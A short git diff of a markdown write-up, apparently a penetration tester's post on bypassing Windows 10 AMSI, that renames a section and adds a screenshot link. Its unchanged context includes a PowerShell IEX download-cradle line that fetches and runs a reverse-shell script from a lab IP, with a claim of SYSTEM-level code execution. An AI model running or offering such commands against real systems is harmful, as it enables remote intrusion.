@@ -2,7 +2,7 @@
 - [**Outline**](#section-0)
 - [**Antimalware Scan Interface Explanation**](#section-1)
 - [ **Proof of Concept - Bypassing 2023 Windows 10 Pro AMSI**](#section-2)
-- [ **Obfuscation Methodolgy Anlysis**](#section-3)
+- [ **Memory Patching & Obfuscation**](#section-3)
 - [ **Credits & Reference**](#section-4)
 
 
@@ -97,6 +97,7 @@ Taking advantage of the AMSI.dll malfunction, the tester successfully initiated 
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
 ```
 Consequently, the tester achieved a  Remote Code Execution (RCE) with NT/Authority System privileges.
+![](/assets/AV/system.png)  
 
 ## Reference
 [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass) && [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
